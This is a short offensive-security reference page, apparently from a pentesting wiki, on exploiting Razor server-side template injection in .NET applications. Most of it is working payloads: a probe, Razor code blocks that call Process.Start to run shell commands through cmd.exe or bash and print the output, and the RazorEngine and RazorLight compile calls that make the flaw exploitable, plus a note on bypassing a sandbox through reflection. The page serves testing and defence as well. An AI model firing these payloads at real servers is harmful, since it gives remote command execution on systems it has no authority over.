---
title: "Razor server-side template injection"
description: "Exploiting Razor SSTI in .NET: confirming with @(7*7), running C# through @{ } blocks to System.Diagnostics.Process.Start, and the RazorEngine/RazorLight RunCompile sink."
keywords:
  - Razor SSTI
  - RazorEngine RunCompile
  - Process.Start
  - RazorLight
  - .NET template injection
---

# Razor

Razor compiles templates to C#, so an injection into template source runs C#. Confirm with `@(7*7)` rendering `49`. A code block then calls into `System.Diagnostics` to run a command:

```razor
@{
  System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
}
```

To capture output for display, redirect standard output:

```razor
@{
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c whoami";
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
}
@p.StandardOutput.ReadToEnd()
```

On Linux-hosted .NET, swap `cmd.exe /c` for `/bin/bash -c`. Razor has no sandbox, so once C# executes, the full framework is reachable (`System.IO.File` for file read/write, `System.Reflection` for loading assemblies).

The sink that makes this exploitable is compiling attacker input as a template. With the standalone libraries this is the `RunCompile`/`Parse` call on untrusted source:

```csharp
Engine.Razor.RunCompile(userInput, "key", null, model);   // RazorEngine
engine.CompileRenderStringAsync("key", userInput, model);  // RazorLight
```

In ASP.NET MVC the equivalent is a runtime-compiled view whose content is built from user input, which is far less common than the library case. As always, data passed to a fixed view is HTML-encoded and safe; the vulnerability requires the template text itself to be attacker-controlled. RazorEngine has had sandbox-escape history (the `IsolatedRazorEngine` boundary was bypassable via reflection), so even a sandboxed configuration warrants testing reflection-based loads of `Process` rather than assuming containment.

## Tools

- SSTImap (limited .NET support); manual payloads

## References

- Microsoft Razor syntax documentation; RazorEngine and RazorLight projects
- PortSwigger Web Security Academy: Server-side template injection
